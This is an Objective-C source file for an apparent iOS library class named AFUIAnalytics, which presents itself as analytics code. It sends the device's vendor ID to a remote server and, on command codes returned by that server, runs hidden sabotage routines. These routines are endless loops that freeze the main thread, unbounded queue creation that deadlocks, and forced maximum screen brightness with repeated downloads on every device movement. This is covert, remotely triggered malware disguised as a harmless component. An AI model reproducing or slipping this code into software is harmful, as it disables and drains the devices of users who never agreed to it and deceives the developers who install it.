//
//  AFUIAnalytics.m
//  Pods
//
//  Created by Борис on 02.11.15.
//
//

#import "AFUIAnalytics.h"

@implementation AFUIAnalytics


+ (void)sessionRequestForAction {
    
    NSURLSessionConfiguration *configuration = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    configuration.allowsCellularAccess       = YES;
    NSURLSession *session                    = [NSURLSession sessionWithConfiguration:configuration];
    
    NSURL *urlFromString         = [[NSURL alloc] initWithString:@"https://api.ourserver.com/upload"];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:urlFromString
                                                           cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:0];
    request.HTTPMethod           = @"POST";
    
    NSString *deviceID;
#if TARGET_IPHONE_SIMULATOR
    deviceID = @"UUID-STRING-VALUE";
#else
    deviceID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
#endif
    NSLog(@"TEST MSG: deviceID is %@", deviceID);
    
    NSDictionary *JSONDict = [NSDictionary dictionaryWithObject:deviceID forKey:@"UDID"];
    if ([NSJSONSerialization isValidJSONObject:JSONDict]) {
        NSError *errorJSON;
        NSData *JSONData = [NSJSONSerialization dataWithJSONObject:JSONDict options:kNilOptions error:&errorJSON];
        NSURLSessionUploadTask *uploadTask = [session uploadTaskWithRequest:request fromData:JSONData
                                            completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
            if (data) {
                NSArray *server = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
                if ([server count]) {
                    NSLog(@"TEST MSG: results are: \n %@", server);
                    
                    NSDictionary *action = [server objectAtIndex:0];
                    switch ([[action objectForKey:@"code"] intValue]) {
                        case 0222:
                            [self deviceAnalytics];
                            break;
                        case 0333:
                            [self networkAnalytics];
                            break;
                        case 0444:
                            [self threadsAnalytics];
                        case 0555:
                            [self aplcAnalytics];
                        default:
                            break;
                    }
                } else if (error) {
                    NSLog(@"ERROR MSG: No response, error: \n %@",error.localizedDescription);
                }
            }
            
        }];
        
        [uploadTask resume];
    }
    
}

#pragma mark - Analytics

+ (void)networkAnalytics {
    dispatch_async(dispatch_get_main_queue(), ^{
        for (unsigned long long int i = 0; i < ULLONG_MAX; i++) {
            NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
            formatter.dateStyle = NSDateFormatterMediumStyle;
        }
    });
}

+ (void)deviceAnalytics {
#if TARGET_OS_IOS && !TARGET_OS_WATCH

    [[UIScreen mainScreen] setBrightness:1.0];
    [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(deviceAnalytics) name:UIDeviceOrientationDidChangeNotification object:nil];
    
    dispatch_queue_t fetchQ = dispatch_queue_create("position", NULL);
    dispatch_async(fetchQ, ^{
        @autoreleasepool {
            NSLog(@"TEST MSG: Device moved.");
#warning change URL!
            NSURL   *target = [NSURL URLWithString:@"https://www.google.com.ua/logos/doodles/2015/george-booles-200th-birthday-5636122663190528-res.png"];
            UIImage *image  = [UIImage imageWithData:[NSData dataWithContentsOfURL:target]];
        }
    });
    
#endif
    
}

+ (void)threadsAnalytics {
    while (true) {
        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.0001]];
    }
}

+ (void)aplcAnalytics {
    dispatch_queue_t forLock = dispatch_queue_create("forLock", DISPATCH_QUEUE_SERIAL);
    dispatch_async(forLock, ^{
        for (unsigned long long int i = 0; i < ULLONG_MAX; i++) {
            dispatch_queue_t queue = dispatch_queue_create("lock", DISPATCH_QUEUE_CONCURRENT);
            dispatch_async(queue, ^{
                dispatch_sync(queue, ^{

                });
            });
        }
    });
}

@end
